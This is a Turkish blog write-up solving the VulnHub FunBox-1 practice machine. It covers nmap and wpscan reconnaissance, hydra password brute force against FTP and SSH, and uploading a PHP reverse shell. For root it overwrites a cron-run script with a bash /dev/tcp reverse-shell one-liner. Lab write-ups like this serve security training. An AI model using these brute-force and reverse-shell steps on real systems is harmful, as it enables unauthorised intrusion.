---
title: "VULN FunBox-1 Write Up"
date: 2020-09-22T20:59:33+03:00
draft: false
toc: true
images:
tags: [Vulnhub,write-up,sudo,cron,ftp] 
categories: [write-up]
author : "Barcode"
Description : "Merhaba, Bu yazımda sizlere [VULNHUB](https://www.vulnhub.com/entry/funbox-1,518/) 'da yer alan FunBox-1 adlı makinanın çözümünden bahsedeceğim. Ben çözerken keyif aldım umarım sizde okurken keyif alırsınız..."
cover : images/vulnhub/funbox1/cover.png
  
---
Merhaba, Bu yazımda sizlere [VULNHUB](https://www.vulnhub.com/entry/funbox-1,518/) 'da yer alan FunBox-1 adlı makinanın çözümünden bahsedeceğim. Ben çözerken keyif aldım umarım sizde okurken keyif alırsınız... :blush:


## 1. Keşif Aşaması

Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.

```bash
netdiscover -i eth1
```

{{< image src="/images/vulnhub/funbox1/discover.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

İp adresi tespit edildikten sonra nmap ile makinenin tüm portları taranır. Açık portlarda çalışan servisler tespit edilir.
```bash
sudo nmap -sV -sC -p- 192.168.56.106
```

```terminal
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-22 07:04 CDT
Nmap scan report for 192.168.56.106 (192.168.56.106)
Host is up (0.00010s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     ProFTPD
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/secret/
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://funbox.fritz.box/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
1 service unrecognized despite returning data. If you know the service/version,
....
MAC Address: 08:00:27:45:D6:F8 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.87 seconds
```
{{< text >}}
<br>
Nmap taramasından görüldüğü gibi site funbox.fritz.box adresine yönlendirilmektedir. İlk olarak /etc/hosts dosyasına <i style="color:yellow;">192.168.56.106  funbox.fritz.box </i>bilgisi eklenir. Daha sonra tarayıcıdan funbox.fritz.box istek atılır. Açılan sayfada footer bölümüne bakıldığında sitenin Wordpress CMS uygulaması olduğu görülmektedir.
<br>
<br>
{{< /text >}}

{{< image src="/images/vulnhub/funbox1/website.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

{{< image src="/images/vulnhub/funbox1/footer.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Nmap taramasında tespit edilen robots.txt dosyasına girilen /secret dizinine gidilir. Dizin içerisinde bir mesaj bırakılmıştır. :neutral_face:

{{< image src="/images/vulnhub/funbox1/secret.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Gobuster aracı ile web dizin taraması yapılır. Dizin ve alt dizin taramaları sonucunda işe yarar bir bilgi edinilememiştir. :confused:

```bash
gobuster dir -u http://funbox.fritz.box/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```

{{< image src="/images/vulnhub/funbox1/gobuster.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Wordpress'e özel araç olan **wpscan** ile tarama gerçeleştirilir. Admin paneli, kullanıcı adları ve parola bilgileri elde edinilmeye çalışılır. Tarama sonucunda *admin* ve *joe* adında iki kullanıcı adı tespit edilir.

```bash
wpscan --url http://funbox.fritz.box/ --enumerate
```

{{< image src="/images/vulnhub/funbox1/wpscan.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Elde edinilen kullanıcı adları ile ssh ve ftp servislerine hydra aracı ile brute force saldırısı yapılır. Her iki serviste de saldırı sonucunda **joe** kullanıcısına ait parola bilgisi elde edilir. Bu aşamadan sonra ftp portundan devam edilmektedir. (Ssh servisine saldırmak sonradan aklıma geldi :pleading_face:) Ssh bağlantısı alınarak da devam edilebilmektedir.

```terminal
hydra -l joe -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.106
```
{{< image src="/images/vulnhub/funbox1/ftp.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

```terminal
hydra -l joe -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.106
```
{{< image src="/images/vulnhub/funbox1/ssh.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

## 2. Erişim Sağlanması

Ftp servisine bağlanılır. Shell almak için web uygulamasının yer aldığı ***/var/www/html*** dizini geçilir, reverse shell almak için **joe** kullanıcısı yetkilerinde olan secret klasörüne dosya yüklenir.
```bash
ftp 192.168.56.106
```

```terminal
Connected to 192.168.56.106.
220 ProFTPD Server (Debian) [::ffff:192.168.56.106]
Name (192.168.56.106:barcode): joe
331 Password required for joe
Password:
230 User joe logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd /var/www/html
250 CWD command successful
ftp> ls -lsa
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxrwxrwx   6 www-data www-data     4096 Jul 18 10:12 .
drwxr-xr-x   4 root     root         4096 Jun 19 11:18 ..
-rwxrwxrwx   1 www-data www-data    10918 Jun 19 11:16 default.htm
-rwxrwxrwx   1 www-data www-data      405 Jul 17 16:02 index.php
-rwxrwxrwx   1 www-data www-data    19915 Jul 17 16:02 license.txt
-rwxrwxrwx   1 www-data www-data     7278 Jul 17 16:02 readme.html
-rw-rw-r--   1 joe      joe            19 Jul 18 10:12 robots.txt
drwxrwxr-x   2 joe      joe          4096 Jul 18 10:05 secret
-rwxrwxrwx   1 www-data www-data     6912 Jul 17 16:02 wp-activate.php
drwxrwxrwx   9 www-data www-data     4096 Jul 17 16:02 wp-admin
-rwxrwxrwx   1 www-data www-data      351 Jul 17 16:02 wp-blog-header.php
-rwxrwxrwx   1 www-data www-data     2332 Jul 17 16:02 wp-comments-post.php
-rwxrwxrwx   1 www-data www-data     3047 Jun 19 11:28 wp-config.php
-rwxrwxrwx   1 www-data www-data     2913 Jul 17 16:02 wp-config-sample.php
drwxrwxrwx   6 www-data www-data     4096 Jul 18 08:44 wp-content
-rwxrwxrwx   1 www-data www-data     3940 Jul 17 16:02 wp-cron.php
drwxrwxrwx  21 www-data www-data    12288 Jul 17 16:02 wp-includes
-rwxrwxrwx   1 www-data www-data     2496 Jul 17 16:02 wp-links-opml.php
-rwxrwxrwx   1 www-data www-data     3300 Jul 17 16:02 wp-load.php
-rwxrwxrwx   1 www-data www-data    47874 Jul 17 16:02 wp-login.php
-rwxrwxrwx   1 www-data www-data     8509 Jul 17 16:02 wp-mail.php
-rwxrwxrwx   1 www-data www-data    19396 Jul 17 16:02 wp-settings.php
-rwxrwxrwx   1 www-data www-data    31111 Jul 17 16:02 wp-signup.php
-rwxrwxrwx   1 www-data www-data     4755 Jul 17 16:02 wp-trackback.php
-rwxrwxrwx   1 www-data www-data     3133 Jul 17 16:02 xmlrpc.php
226 Transfer complete
ftp> cd secret
250 CWD command successful
ftp> put reverse.php
local: reverse.php remote: reverse.php
200 PORT command successful
150 Opening BINARY mode data connection for reverse.php
226 Transfer complete
3475 bytes sent in 0.00 secs (11.3494 MB/s)
ftp> ls -lsa
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxrwxr-x   2 joe      joe          4096 Sep 22 13:59 .
drwxrwxrwx   6 www-data www-data     4096 Jul 18 10:12 ..
-rw-rw-r--   1 joe      joe            30 Jul 18 10:05 index.html
-rw-r--r--   1 joe      joe          3475 Sep -22 13:59 reverse.php
226 Transfer complete
```
Netcat ile 4444 numaralı port dinlenmeye başlanır ve tarayıcından http://funbox.fritz.box/secret/reverse.php istek atılırak terminal bağlantısı sağlanır.

{{< image src="/images/vulnhub/funbox1/firstac.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

www-data kullanısından ```su joe ``` komutu ve ftp servisinde kullanılan parola bilgisi kullanılarak joe kullanıcısına yetki yükseltilir.

{{< image src="/images/vulnhub/funbox1/firstpriv.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}
## 3. Yetki Yükseltme

Home dizinine geçilerek diğer kullanıcılara bakıldığında **funny** kullanısına ait klasör görülmektedir. Klasör joe kullanıcısını erişime açıktır. Klasör içeriği listelenir.

{{< image src="/images/vulnhub/funbox1/funnyhome.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Dizinde yer alan sh uzantılı dosyalar görüntülenir.

```bash
cat .backup.sh 
#!/bin/bash
tar -cf /home/funny/html.tar /var/www/html

cat .reminder.sh 
#!/bin/bash
echo "Hi Joe, the hidden backup.sh backups the entire webspace on and on. Ted, the new admin, test it in a long run." | mail -s"Reminder" joe@funbox
```
**.backup.sh** dosyası web dizininde yer alan dosyaların yedeklerini almaktadır. Sistem hakkında daha fazla bilgi toplamak için [LinEnum Betiği](https://github.com/rebootuser/LinEnum) kullanılır. Sonuçlar incelendiğinde .backup.sh dosyasının funny kullanıcısının cron görevi olduğu görülmektedir.

{{< image src="/images/vulnhub/funbox1/cron.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Ayrıca funny kullanıcısının yüksek yetkili kullanıcı olduğu tespit edilmektedir.

{{< image src="/images/vulnhub/funbox1/yetki.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Sistemde çalışan cron servisinin hangi kullanıcı yetkisinde çalıştığı incelenir.
```bash
ps aux | grep cron
```
{{< image src="/images/vulnhub/funbox1/ps.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Cron uygulaması root yetkisinde çalışmaktadır. .backup.sh dosyası içeriğinde yer alan komutlar funny kullanıcısının ile çalışacaktır. Funny kullanıcısı sudo yetkisine sahiptir. Bu nedenle komutlar sudo ile verildiğinde root  yetkisinde çalışmaktadır. Dosya aşağıdaki gibi düzenlenir.

```bash
echo "sudo bash -c 'exec bash -i &>/dev/tcp/192.168.56.105/7776 <&1'" > .backup.sh
```

nc ile 7776 numaralı port dinlenir ve kısa bir süre otomatik bağlantı gerçekleşmektedir. Root dizini altındaki flag değerine ulaşılarak çözümleme tamamlanır.

{{< image src="/images/vulnhub/funbox1/root.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}
{{< text >}}Yetki yükseltme aşaması biraz zaman alsa da çözülmeye değer bir makinaydı. :hugs:
{{< /text >}}
{{< image src="/images/vulnhub/funbox1/finally.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}













 






